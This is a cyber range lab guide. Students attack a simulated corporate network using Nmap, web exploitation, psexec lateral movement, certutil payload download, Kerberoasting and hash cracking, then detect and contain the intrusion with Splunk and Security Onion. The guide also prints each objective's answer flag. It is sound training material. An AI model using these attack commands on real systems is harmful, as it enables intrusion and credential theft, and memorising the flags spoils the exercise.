# Lab Guide: Red Team / Blue Team Cyber Range

## Overview

In this lab, you will experience both sides of a cybersecurity engagement. As a **Red Team** operator, you will conduct reconnaissance, exploit vulnerabilities, and move laterally across a simulated corporate network. As a **Blue Team** defender, you will detect attacks, investigate incidents, and implement containment measures using industry-standard security tools.

This lab simulates a realistic corporate environment with an Active Directory domain, a web server in a DMZ, a Windows workstation, and a pfSense firewall separating network segments.

**Difficulty:** Advanced
**Estimated Duration:** 4 hours
**Total Points:** 1,400

### Learning Objectives

By completing this lab, you will be able to:

- Perform network reconnaissance using Nmap
- Identify and exploit web application vulnerabilities
- Execute lateral movement techniques across network segments
- Escalate privileges in an Active Directory environment
- Detect intrusions using a SIEM (Splunk) and network security monitoring (Security Onion)
- Implement incident containment and eradication procedures
- Write a professional after-action report documenting an incident timeline

---

## Network Topology

```
                          ┌──────────────────────┐
                          │    pfSense Firewall   │
                          │    .1 on all subnets  │
                          └──┬────────┬────────┬──┘
                             │        │        │
              ┌──────────────┘        │        └──────────────┐
              │                       │                       │
     ┌────────┴────────┐    ┌────────┴────────┐    ┌────────┴────────┐
     │   Attack Net    │    │  Corporate Net  │    │     DMZ Net     │
     │  10.X.Y.0/24    │    │  10.X.Y.0/24    │    │  10.X.Y.0/24   │
     └────────┬────────┘    └───┬─────┬───┬───┘    └────────┬────────┘
              │                 │     │   │                  │
     ┌────────┴────────┐       │     │   │        ┌────────┴────────┐
     │   Kali Linux    │       │     │   │        │ Linux Web Server│
     │  (Red Team)     │       │     │   │        │  Ubuntu 22.04   │
     │   .10           │       │     │   │        │   .30           │
     └─────────────────┘       │     │   │        └─────────────────┘
                               │     │   │
                ┌──────────────┘     │   └──────────────┐
                │                    │                  │
     ┌──────────┴──────────┐  ┌─────┴──────────┐  ┌───┴─────────────┐
     │  Windows 10         │  │ Windows Server  │  │ Security Onion  │
     │  Workstation        │  │ (Active Dir.)   │  │  (Blue Team)    │
     │   .20               │  │   .21           │  │   .50           │
     └─────────────────────┘  └────────────────┘  └─────────────────┘
                                                         │
                                                  ┌──────┴──────────┐
                                                  │  Splunk SIEM    │
                                                  │   .51           │
                                                  └─────────────────┘
```

> **Note:** `X` and `Y` are dynamically assigned based on your class and student ID.

---

## VM Descriptions and Credentials

| VM                        | OS                  | Role        | RAM    | CPU | IP Address   |
|---------------------------|---------------------|-------------|--------|-----|-------------|
| Kali Linux (Red Team)     | Kali Linux 2024.1   | Attacker    | 4 GB   | 2   | .10         |
| Windows 10 Workstation    | Windows 10 Pro      | Target      | 4 GB   | 2   | .20         |
| Windows Server (AD)       | Windows Server 2019 | Target      | 4 GB   | 2   | .21         |
| Linux Web Server          | Ubuntu Server 22.04 | Target      | 2 GB   | 1   | .30         |
| pfSense Firewall          | pfSense 2.7         | Network     | 2 GB   | 2   | .1          |
| Security Onion (Blue Team)| Security Onion 2.4   | Monitor     | 8 GB   | 4   | .50         |
| Splunk SIEM               | Splunk Enterprise    | Monitor     | 8 GB   | 4   | .51         |

> **Credentials:** VM login credentials are displayed in the CyberLab sidebar when you select each VM. Credentials are unique to your session and generated automatically.

---

## Objectives Walkthrough

### Objective 1: Initial Reconnaissance (100 points)

**Goal:** Perform network reconnaissance to identify live hosts, open ports, and running services within the target network.

**Flag:** `FLAG{recon_complete_hosts_discovered_7a3b}`

#### Step-by-Step

1. Connect to the **Kali Linux** VM from the CyberLab sidebar.

2. Open a terminal. First, discover your network configuration:

```bash
ip addr show
```

Note your IP address on the attack-net interface.

3. Perform a ping sweep to discover live hosts on the corporate network:

```bash
nmap -sn 10.X.Y.0/24
```

Replace `X.Y` with your assigned network octets (visible in the VM's IP address).

4. Run a detailed scan on discovered hosts to identify open ports and services:

```bash
nmap -sV -sC -O -p- 10.X.Y.20-30 -oN recon_results.txt
```

This performs:
- `-sV` -- Service version detection
- `-sC` -- Default NSE scripts
- `-O` -- OS fingerprinting
- `-p-` -- All 65,535 ports
- `-oN` -- Save output to a file

5. Review the scan results. You should find services such as:
   - Port 80/443 on the web server (.30)
   - Port 445/3389 on the Windows workstation (.20)
   - Port 88/389/445 on the domain controller (.21)

6. Once you have documented all live hosts and their services, the flag will appear in `/opt/flags/recon_flag.txt` on the Kali machine after you save your scan results:

```bash
cat /opt/flags/recon_flag.txt
```

7. Submit the flag in the CyberLab interface.

---

### Objective 2: Exploit Web Server Vulnerability (200 points)

**Goal:** Identify and exploit a vulnerability on the Linux web server to gain initial access.

**Flag:** `FLAG{web_server_compromised_rce_9f1e}`

#### Step-by-Step

1. From Kali, browse to the web server:

```bash
firefox http://10.X.Y.30 &
```

2. Enumerate the web application for directories and files:

```bash
gobuster dir -u http://10.X.Y.30 -w /usr/share/wordlists/dirb/common.txt
```

3. Look for interesting endpoints. Check for a login page, admin panel, or file upload functionality.

4. Test for common vulnerabilities:
   - SQL injection on login forms
   - Command injection in input fields
   - File inclusion vulnerabilities

5. Use Nikto for automated vulnerability scanning:

```bash
nikto -h http://10.X.Y.30
```

6. Once you identify the vulnerable component (check for outdated software versions), search for a known exploit:

```bash
searchsploit [software_name] [version]
```

7. Exploit the vulnerability to gain a shell on the web server. You may use Metasploit or a manual exploit.

8. Once you have a shell, find the flag:

```bash
find / -name "flag.txt" 2>/dev/null
cat /var/www/flag.txt
```

9. Submit the flag.

---

### Objective 3: Lateral Movement to Workstation (200 points)

**Goal:** Move laterally from the compromised web server to the Windows 10 workstation.

**Flag:** `FLAG{lateral_movement_workstation_4d2c}`

#### Step-by-Step

1. From your shell on the web server, enumerate the system for useful information:

```bash
cat /etc/passwd
ls -la /home/
find / -name "*.key" -o -name "*.pem" -o -name "id_rsa" 2>/dev/null
cat /var/www/html/config.php  # Look for database credentials
```

2. Check for stored credentials or configuration files that contain passwords:

```bash
grep -r "password" /var/www/ --include="*.php" --include="*.conf" 2>/dev/null
```

3. If you find credentials, test them against the Windows workstation. From Kali:

```bash
crackmapexec smb 10.X.Y.20 -u [username] -p [password]
```

4. If SMB access is available, you can use PsExec or WMI to get a shell:

```bash
impacket-psexec [domain]/[username]:[password]@10.X.Y.20
```

5. Alternatively, if you find SSH keys, use them to pivot through the network.

6. Once you have access to the Windows workstation, find the flag on the desktop or in a well-known location:

```cmd
type C:\Users\Public\Documents\flag.txt
```

7. Submit the flag.

---

### Objective 4: Privilege Escalation on Active Directory (300 points)

**Goal:** Escalate privileges to domain admin on the Active Directory server.

**Flag:** `FLAG{domain_admin_achieved_8b7a}`

#### Step-by-Step

1. From the Windows workstation, enumerate the Active Directory environment. Upload SharpHound to the workstation:

```cmd
# From your Kali machine, serve files:
python3 -m http.server 8888

# On the workstation:
certutil -urlcache -split -f http://10.X.Y.10:8888/SharpHound.exe SharpHound.exe
SharpHound.exe --CollectionMethods All
```

2. Transfer the BloodHound data back to Kali and analyze it in BloodHound to find attack paths to Domain Admin.

3. Enumerate service accounts for Kerberoasting:

```bash
impacket-GetUserSPNs [domain]/[username]:[password] -dc-ip 10.X.Y.21 -request
```

4. If you obtain a Kerberos TGS ticket, crack it offline:

```bash
hashcat -m 13100 kerberos_hash.txt /usr/share/wordlists/rockyou.txt
```

5. With the cracked service account password, check if the account has elevated privileges:

```bash
crackmapexec smb 10.X.Y.21 -u [service_account] -p [cracked_password]
```

6. Use the elevated credentials to access the domain controller:

```bash
impacket-psexec [domain]/[service_account]:[password]@10.X.Y.21
```

7. Verify Domain Admin access:

```cmd
whoami /groups
net group "Domain Admins" /domain
```

8. Find the flag:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

9. Submit the flag.

---

### Objective 5: Blue Team -- Detect Initial Access (150 points)

**Goal:** Using Security Onion or Splunk, detect and document the initial access event on the web server.

**Flag:** `FLAG{initial_access_detected_blue_5e9d}`

#### Step-by-Step

1. Connect to the **Security Onion** VM or **Splunk SIEM** VM.

2. **In Splunk**, navigate to the Search & Reporting app. Search for web server events:

```spl
index=* sourcetype=access_combined host="web-server"
| sort -_time
```

3. Look for suspicious HTTP requests that indicate exploitation:
   - Unusual User-Agent strings
   - Long or encoded URLs
   - POST requests to unexpected endpoints
   - HTTP 200 responses to exploit payloads

4. **In Security Onion**, open the Alerts dashboard (Kibana/SOC):
   - Look for IDS alerts from Suricata or Zeek
   - Filter by destination IP of the web server
   - Check for alerts categorized as "Exploit" or "Web Application Attack"

5. Document the following information:
   - Timestamp of the initial access
   - Source IP address of the attacker
   - Attack technique used
   - Evidence from logs or alerts

6. Once you have documented the detection, a validation script checks your findings. The flag is displayed in the Security Onion console:

```bash
/opt/validation/check_detection.sh
```

7. Submit the flag.

---

### Objective 6: Blue Team -- Identify Lateral Movement (150 points)

**Goal:** Detect and document the lateral movement activity between compromised systems.

**Flag:** `FLAG{lateral_movement_detected_blue_3c8f}`

#### Step-by-Step

1. **In Splunk**, search for authentication events on the Windows workstation:

```spl
index=* sourcetype=WinEventLog:Security EventCode=4624 OR EventCode=4625
| table _time, Account_Name, Source_Network_Address, Logon_Type
| sort -_time
```

Key indicators of lateral movement:
- Logon Type 3 (Network) from unexpected source IPs
- Logon Type 10 (Remote Interactive / RDP) from internal hosts
- Multiple failed logins followed by a success (password spraying)

2. **In Security Onion**, check Zeek connection logs for unusual SMB or WinRM traffic:
   - SMB connections between the web server and the workstation
   - WinRM (port 5985/5986) connections
   - PsExec activity (named pipe creation over SMB)

3. Correlate events across multiple log sources:
   - Web server access logs (source of the attack)
   - Network flow data (Zeek conn.log)
   - Windows Security event logs (authentication)

4. Document:
   - The lateral movement technique used
   - Source and destination hosts
   - Timestamps
   - Evidence from logs

5. Run the validation script:

```bash
/opt/validation/check_lateral.sh
```

6. Submit the flag.

---

### Objective 7: Blue Team -- Contain and Eradicate (200 points)

**Goal:** Implement containment measures to stop the attack and eradicate the attacker's persistence mechanisms.

**Flag:** `FLAG{threat_contained_eradicated_2a6b}`

#### Step-by-Step

1. **Containment -- Network Isolation:**

Connect to the **pfSense Firewall** and create firewall rules to isolate compromised systems:

- Block all traffic from the web server (.30) to the corporate network
- Block all traffic from the workstation (.20) to the domain controller (.21) except legitimate AD traffic

2. **Eradication -- Check for Persistence:**

On the compromised Windows workstation, check for:

```cmd
# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task\|run\|author"

# New user accounts
net user

# Registry run keys
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Services
sc query state= all | findstr /i "service_name\|display_name\|state"

# Startup folder
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
```

3. Remove any persistence mechanisms you find:

```cmd
# Remove suspicious scheduled tasks
schtasks /delete /tn "TaskName" /f

# Remove suspicious registry entries
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SuspiciousEntry" /f

# Disable suspicious accounts
net user [suspicious_account] /active:no
```

4. On the web server, check for:

```bash
# Cron jobs
crontab -l
ls -la /etc/cron.d/

# SSH authorized keys
find / -name "authorized_keys" 2>/dev/null

# Web shells
find /var/www -name "*.php" -newer /var/www/html/index.php 2>/dev/null

# Unusual processes
ps aux | grep -v "root\|www-data\|syslog"
```

5. After completing containment and eradication, run the validation:

```bash
/opt/validation/check_containment.sh
```

6. Submit the flag.

---

### Objective 8: Write After-Action Report (100 points)

**Goal:** Both teams compile a comprehensive after-action report documenting the full attack chain, detection timeline, and lessons learned.

**Flag:** `FLAG{after_action_report_complete_1d4e}`

#### Step-by-Step

1. Create a report document that includes the following sections:

**Executive Summary**
- Brief overview of the engagement (2--3 sentences)

**Attack Timeline (Red Team)**
- Chronological list of all red team activities with timestamps
- Tools and techniques used at each stage
- MITRE ATT&CK technique IDs for each action

**Detection Timeline (Blue Team)**
- When each attack phase was detected
- Which tools/logs provided the detection
- Time gap between attack and detection

**Findings**
- Vulnerabilities exploited
- Misconfigurations discovered
- Detection gaps identified

**Recommendations**
- Specific remediation steps for each vulnerability
- Detection improvements
- Security architecture recommendations

2. Save your report as a text file on the Kali machine:

```bash
nano /home/kali/after_action_report.txt
```

3. Run the validation script to verify your report:

```bash
/opt/validation/check_report.sh /home/kali/after_action_report.txt
```

4. Submit the flag.

---

## Hints and Tips

### General

- **Take screenshots** as you go. They are useful for your after-action report and for proving your work.
- **Document everything** in a text file: commands used, outputs received, IPs, usernames, passwords.
- **Work as a team** if this is a group lab. Assign red and blue team roles among your group members.

### Red Team Tips

- Start with reconnaissance. Never skip the enumeration phase.
- Try the simplest attack vectors first before moving to complex ones.
- If an exploit fails, check your payload settings (IP, port, target architecture).
- Use `msfconsole` for Metasploit framework access.
- Keep your shells alive -- use `screen` or `tmux` to manage multiple sessions.

### Blue Team Tips

- Set up your monitoring tools first. Begin watching logs before the red team starts attacking.
- Create Splunk dashboards or saved searches for common indicators of compromise.
- Use Security Onion's Kibana interface for visualization and correlation.
- Set alerts for high-severity events so you get notified in real-time.

---

## Additional Resources

- [MITRE ATT&CK Framework](https://attack.mitre.org/) -- Reference for attack techniques and tactics
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) -- Common web application vulnerabilities
- [Nmap Reference Guide](https://nmap.org/book/man.html) -- Complete Nmap documentation
- [Splunk Search Reference](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference) -- SPL query syntax
- [Security Onion Documentation](https://docs.securityonion.net/) -- Security Onion setup and usage
- [BloodHound Documentation](https://bloodhound.readthedocs.io/) -- Active Directory attack path analysis
- [CyberChef](https://gchq.github.io/CyberChef/) -- Data encoding/decoding tool

---

## Expected Outcomes

After completing this lab, you should be able to:

1. **Conduct a full penetration testing engagement** from reconnaissance through post-exploitation.
2. **Detect attacks in progress** using SIEM and network security monitoring tools.
3. **Correlate events across multiple log sources** to build an incident timeline.
4. **Implement incident response procedures** including containment and eradication.
5. **Write a professional after-action report** that communicates findings to both technical and non-technical audiences.
6. **Map real-world attacks to the MITRE ATT&CK framework** for standardized reporting.
7. **Understand the attacker-defender dynamic** and why defense-in-depth is essential.
